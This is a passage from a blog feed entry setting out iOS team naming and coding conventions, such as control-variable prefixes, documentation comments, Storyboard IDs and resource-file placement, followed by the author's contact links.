<p>6.5    NSDictionary/ NSMutableDictionary类型变量：变量名使用后缀Dic<br>6.6    控件类型变量命名规范：<br>&nbsp;&nbsp;&nbsp;&nbsp;6.6.1    UIView类型变量：XXXView<br>&nbsp;&nbsp;&nbsp;&nbsp;6.6.2    UIScrollView类型变量：XXXScrollView<br>&nbsp;&nbsp;&nbsp;&nbsp;6.6.3    UIImageView类型变量：imgXXX<br>&nbsp;&nbsp;&nbsp;&nbsp;6.6.4    UIButton类型变量：btXXX<br>&nbsp;&nbsp;&nbsp;&nbsp;6.6.5    UILabel类型变量：lblXXX<br>&nbsp;&nbsp;&nbsp;&nbsp;以此类推</p>
<p><br></p>
<h2 id="7-注释"><a href="#7-注释" class="headerlink" title="7 注释"></a><strong>7 注释</strong></h2><p>7.1    变量、方法、枚举使用标准<strong>文档</strong>注释<br>&nbsp;&nbsp;&nbsp;&nbsp;7.1.1    变量注释应详细描述变量用途<br>&nbsp;&nbsp;&nbsp;&nbsp;7.1.2    枚举注释应详细描述枚举和每一个元素用途<br>&nbsp;&nbsp;&nbsp;&nbsp;7.1.3    方法注释应详细描述方法作用、参数意义、返回值意义</p>
<p><img src="http://7xnrog.com1.z0.glb.clouddn.com/blog_iOS%E5%91%BD%E5%90%8D%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%84%E8%8C%83%E6%96%87%E6%A1%A3008.png" alt="注释"></p>
<p>7.2    其他使用单行注释</p>
<p><br></p>
<h2 id="8-Storyboard-ID"><a href="#8-Storyboard-ID" class="headerlink" title="8    Storyboard ID"></a><strong>8    Storyboard ID</strong></h2><p>8.1    自定义的并只在Storyboard 出现一次的Controller，其Storyboard ID与类型名相同<br>8.2    其他情况必须起有意义的名字</p>
<p><br></p>
<h2 id="9-资源文件规范"><a href="#9-资源文件规范" class="headerlink" title="9 资源文件规范"></a><strong>9 资源文件规范</strong></h2><p>1.1    资源文件全部放入Supporting Files文件夹下<br>1.2    图片资源放入Assets.xcassets。可以建立自己的Folder</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#58;&#x63;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x63;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#x31;&#54;&#x33;&#x2e;&#x63;&#x6f;&#109;</a>。</p>
<p>博主主要写javaEE和iOS的。</p>
<p>希望大家一起进步。</p>
<p>CSDN： <a href="http://blog.csdn.net/u010127917" target="_blank" rel="external">CSDN博客地址</a></p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目经理的要求，给成员写一份简单的命名和编码规范，因为成员很多都是新人，甚至还有刚开始接触规范编码的，所以我就写了一份简单的。&lt;/p&gt;
&lt;p&gt;还有很多不完善的地方，而且只是针对这次项目的，只是给一个参考。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;XXXiOS项目-命名及编码规范&quot;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
</feed>
